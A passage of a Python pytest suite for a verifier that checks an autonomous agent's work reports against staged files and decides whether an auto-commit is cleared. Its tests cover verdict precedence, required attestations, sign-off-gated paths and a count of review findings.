    def test_malformed_outranks_mismatch(self):
        text = GOOD_REPORT.replace("UNVERIFIED: none\n", "")
        assert rv.verify(text, reality(staged=[]))["verdict"] == rv.MALFORMED

    def test_mismatch_outranks_inconclusive(self):
        r = reality(staged=[], rerun=[{"cmd": "pytest", "passed": None, "declared": 1}])
        assert rv.verify(GOOD_REPORT, r)["verdict"] == rv.MISMATCH

    def test_exit_codes_are_distinct_and_only_counts_match_is_zero(self):
        assert rv.EXIT_CODES[rv.COUNTS_MATCH] == 0
        assert len(set(rv.EXIT_CODES.values())) == len(rv.EXIT_CODES)
        assert all(v != 0 for k, v in rv.EXIT_CODES.items() if k != rv.COUNTS_MATCH)

    def test_precedence_list_covers_every_verdict(self):
        assert set(rv.VERDICT_PRECEDENCE) == set(rv.EXIT_CODES)


class TestRenderShape:
    def test_render_returns_text_and_style_pairs(self):
        for line, styles in rv.render(rv.verify(GOOD_REPORT, reality()), "demo", 1):
            assert isinstance(line, str)
            assert isinstance(styles, tuple)

    def test_header_names_session_and_packet(self):
        out = rendered(rv.verify(GOOD_REPORT, reality()), sid="rl-verify", packet=7)
        assert "rl-verify" in out and "packet 007" in out


# ── auto-commit clearance (#16 phase 2) ───────────────────────────────────────────────────────
def cleared_lines(clr):
    return "\n".join(line for line, _ in rv.render_clearance(clr))


def clr_for(report=GOOD_REPORT, staged=("src/app.py",), staged_diff="", **attest):
    attest.setdefault("in_plan", True)
    attest.setdefault("diff_reviewed", True)
    return rv.clearance(rv.verify(report, reality(staged=staged)), staged_diff, **attest)


class TestClearanceConditions:
    """The gate that lets an autonomous lead commit without asking. All five must hold; the
    headline names the FIRST failure in numeric order so the announce can cite one condition."""

    def test_all_five_holding_clears(self):
        clr = clr_for()
        assert clr["cleared"] is True
        assert clr["reason"] is None
        assert "AUTO-COMMIT: CLEARED" in cleared_lines(clr)

    @pytest.mark.parametrize("staged,expected_verdict", [
        (["other.py"], rv.MISMATCH),  # report claims src/app.py, nothing staged matches
    ])
    def test_condition_1_non_counts_match_verdict_stops(self, staged, expected_verdict):
        clr = clr_for(staged=staged)
        assert clr["cleared"] is False
        assert clr["reason"] == f"verdict-is-{expected_verdict}"

    def test_condition_1_malformed_stops(self):
        clr = clr_for(report=GOOD_REPORT.replace("UNVERIFIED: none\n", ""))
        assert clr["reason"] == "verdict-is-MALFORMED"

    def test_condition_2_clean_with_caveats_stops(self):
        """Named explicitly in the doctrine: the caveats are the point."""
        clr = clr_for(report=GOOD_REPORT.replace("Status: clean", "Status: clean-with-caveats"))
        assert clr["cleared"] is False
        assert clr["reason"] == "status-not-clean"

    def test_condition_2_risk_flags_stop(self):
        clr = clr_for(report=GOOD_REPORT.replace("Risk flags: none",
                                                 "Risk flags: weakened a parity assertion"))
        assert clr["reason"] == "risk-flags-present"

    def test_condition_2_unverified_claims_stop(self):
        clr = clr_for(report=GOOD_REPORT.replace("UNVERIFIED: none",
                                                 "UNVERIFIED: assumed the CI venv matches"))
        assert clr["reason"] == "unverified-claims-present"

    def test_condition_3_requires_the_in_plan_attestation(self):
        clr = clr_for(in_plan=False)
        assert clr["cleared"] is False
        assert clr["reason"] == "not-attested-in-plan"

    def test_condition_5_requires_the_diff_reviewed_attestation(self):
        clr = clr_for(diff_reviewed=False)
        assert clr["cleared"] is False
        assert clr["reason"] == "not-attested-diff-reviewed"

    def test_a_bare_call_can_never_clear(self):
        """The safety property: attestations default off, so nothing that forgets to assert them
        can be read as clearance."""
        clr = rv.clearance(rv.verify(GOOD_REPORT, reality()), "")
        assert clr["cleared"] is False

    def test_attestations_are_marked_as_uncheckable_in_the_output(self):
        out = cleared_lines(clr_for())
        assert out.count("[lead's attestation — this tool cannot check it]") == 2

    def test_cleared_output_says_it_clears_automation_not_correctness(self):
        out = cleared_lines(clr_for())
        assert "clears the AUTOMATION only" in out
        assert "not a statement that the work is correct" in out

    def test_not_cleared_output_says_fall_back_to_asking(self):
        out = cleared_lines(clr_for(in_plan=False))
        assert "NOT-CLEARED-BECAUSE-not-attested-in-plan" in out
        assert "stop and ask" in out

    def test_first_failure_in_numeric_order_is_the_headline(self):
        """Verdict (1) outranks the attestations (3, 5) so the lead is pointed at the earliest
        problem rather than the last one evaluated."""
        clr = clr_for(report=GOOD_REPORT.replace("UNVERIFIED: none\n", ""), in_plan=False,
                      diff_reviewed=False)
        assert clr["reason"] == "verdict-is-MALFORMED"

    def test_every_condition_is_reported_even_when_one_fails(self):
        clr = clr_for(in_plan=False)
        assert [c["n"] for c in clr["conditions"]] == [1, 2, 3, 4, 5]


class TestCountFindings:
    """skills/review/SKILL.md's fixed prompt: 'numbered findings, each `file:line —
    blocker|should-fix|note — one sentence`'. Pure line-count feeding `report_reviewed`'s ledger
    event — not a format validator."""

    def test_counts_numbered_lines(self):
        text = ("1. src/app.py:12 — blocker — off-by-one on the last page.\n"
                "2. lib/x.py:4 — should-fix — dead branch.\n"
                "3. lib/y.py:9 — note — could be a one-liner.\n")
        assert rv.count_findings(text) == 3

    def test_recommendation_line_is_not_a_finding(self):
        text = "1. a.py:1 — note — fine.\n\nRecommendation: commit.\n"
        assert rv.count_findings(text) == 1

    def test_no_findings_is_zero(self):
        assert rv.count_findings("No findings. Recommendation: commit.\n") == 0

    def test_empty_text_is_zero(self):
        assert rv.count_findings("") == 0

    def test_indented_numbered_lines_still_count(self):
        assert rv.count_findings("  1. a.py:1 — note — fine.\n") == 1


class TestSignoffGating:
    """Condition 4. Blunt substring matching on purpose: a false 'sign-off needed' costs one
    question, a false clearance costs trust."""

    @pytest.mark.parametrize("path", [
        "hooks/stop_lead_watch.py", "lib/lead_guard.py", "db/migrations/001.sql",
        "tests/test_parity.py", "tests/golden/out.json", "schema/user.sql", "deploy/run.sh"])
    def test_signoff_gated_paths_stop_clearance(self, path):
        # Both the TL;DR `Changed:` line and the body must name `path` — leaving the TL;DR line
        # saying `src/app.py` (row 76's structured source, now claimed_paths' primary source)
        # would itself claim a file this test never stages, tripping condition 1 before condition
        # 4 ever gets evaluated.
        report = GOOD_REPORT.replace("Changed: one line appended to src/app.py",
                                     f"Changed: one line appended to {path}") \
                            .replace("- src/app.py:2 — appended the new line.",
                                     f"- {path}:1 — changed it.")
        clr = clr_for(report=report, staged=[path])
        assert clr["cleared"] is False
        assert clr["reason"] == "signoff-gated-path-touched"
        assert path in cleared_lines(clr)

    def test_ordinary_paths_do_not_trip_it(self):
        assert rv.signoff_hits(["src/app.py", "README.md"]) == []

    def test_ledger_format_edits_stop_clearance(self):
        """A ledger change is a shape of edit, not a path — detected in the staged diff."""
        clr = clr_for(staged_diff="+    append_ledger(\"auto_commit\", session_id=x)\n")
        assert clr["cleared"] is False
        assert clr["reason"] == "signoff-gated-path-touched"
        assert "ledger format" in cleared_lines(clr)

    def test_an_unrelated_diff_does_not_trip_the_ledger_check(self):
        assert rv.signoff_hits(["src/app.py"], "+    print('hello')\n") == []

    def test_signoff_hit_reports_a_reason_per_path(self):
        hits = rv.signoff_hits(["hooks/x.py"])
        assert len(hits) == 1 and "wake/gate" in hits[0][1]
